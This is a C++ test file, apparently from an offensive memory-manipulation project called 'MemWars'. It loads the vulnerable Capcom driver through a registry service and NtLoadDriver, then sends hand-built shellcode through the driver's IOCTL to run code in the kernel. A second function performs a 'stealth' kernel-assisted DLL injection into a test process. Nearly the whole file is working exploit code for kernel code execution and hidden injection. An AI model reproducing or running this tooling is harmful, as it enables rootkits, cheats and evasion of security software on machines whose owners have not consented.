#include <windows.h>
#include <iostream>
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"
#include "Injector.h"

using namespace std;

NON_PAGED_CODE void __stdcall Test(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID userData) {

}

void DriverLoadingTest() {

    if (!LockMemorySections()) {
        cout << "DriverLoadingTest failed. LockMemorySections failed" << endl;
    }

    DecryptDriver();

    if (RemoveSimilarDrivers(CAPCOM_DRIVER) != STATUS_SUCCESS) {
		printf("DriverLoadingTest failed. Failed to remove similar drivers!\n");
		return;
	}
    
    wstring driverName = CreateDriverName();
	globalCapcomDriverName = driverName;
    
    if (!CreateDriverFile(driverName.c_str())) {
		cout << "DriverLoadingTest failed. CreateDriverFile failed" << endl;
        return;
    }

    BOOLEAN alreadyEnabled = FALSE;
    if (RtlAdjustPrivilege(SeLoadDriverPrivilege, 1ull, AdjustCurrentProcess, &alreadyEnabled) != STATUS_SUCCESS && !alreadyEnabled) {
		cout << "DriverLoadingTest failed. RtlAdjustPrivilege failed" << endl;
        return;
    }
    
    if (AddServiceToRegistry(driverName.c_str()) != STATUS_SUCCESS) {
		cout << "DriverLoadingTest failed. AddServiceToRegistry failed" << endl;
        return;
    }
    
    wstring sourceRegistry = wstring(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driverName;

    UNICODE_STRING sourceRegistryUnicode = {0};
    sourceRegistryUnicode.Buffer = (wchar_t*) sourceRegistry.c_str();
    sourceRegistryUnicode.Length = (sourceRegistry.size()) * 2;
    sourceRegistryUnicode.MaximumLength = (sourceRegistry.size() + 1) * 2;

    cout << "about to call NtLoadDriver..." << endl;
    system("PAUSE");

    NTSTATUS status = NtLoadDriver(&sourceRegistryUnicode);
    printf("NtLoadDriver(%ls) returned %08x\n", sourceRegistry.c_str(), status);

    cout << "about to open device..." << endl;
    system("PAUSE");
    HANDLE device = OpenDevice("Htsysm72FB");

    CapcomCodePayload* codePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BYTE codePayloadBuf[] = {
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, userData
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };

    *(ULONGLONG*)(codePayloadBuf + 5) = (ULONGLONG)Test;
    *(ULONGLONG*)(codePayloadBuf + 15) = (ULONGLONG)0;

    codePayload->pointerToPayload = codePayload->payload;

    ZeroMemory(codePayload->payload, PAYLOAD_BUFFER_SIZE);
    CopyMemory(codePayload->payload, codePayloadBuf, sizeof(codePayloadBuf));

    cout << "about to send iotcl..." << endl;
    system("PAUSE");
    status = 0x0;
    DWORD bytesReturned = 0x0;
    DeviceIoControl(device, IOCTL_RunPayload64, &codePayload->pointerToPayload, sizeof(ULONG_PTR), &status, sizeof(status), &bytesReturned, 0);
    printf("DeviceIoControl returned %08x\n", status);

    UnloadDriver(driverName.c_str());
    RemoveDriverFromRegistry(driverName.c_str());
}



void HiddenKernelDLLInjectionAttackTest() {

    system("start /B TestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("TestApp.exe");
    }

    if (!StealthInject("TestApp.exe", "InjectedDLL.dll")) {
        cout << "HiddenKernelDLLInjectionAttack() failed" << endl;
    } else {
        cout << "HiddenKernelDLLInjectionAttack() success" << endl;
    }
    
    
    system("taskkill /IM TestApp.exe /F >nul");
}

int main() {
    // DriverLoadingTest();
    HiddenKernelDLLInjectionAttackTest();
}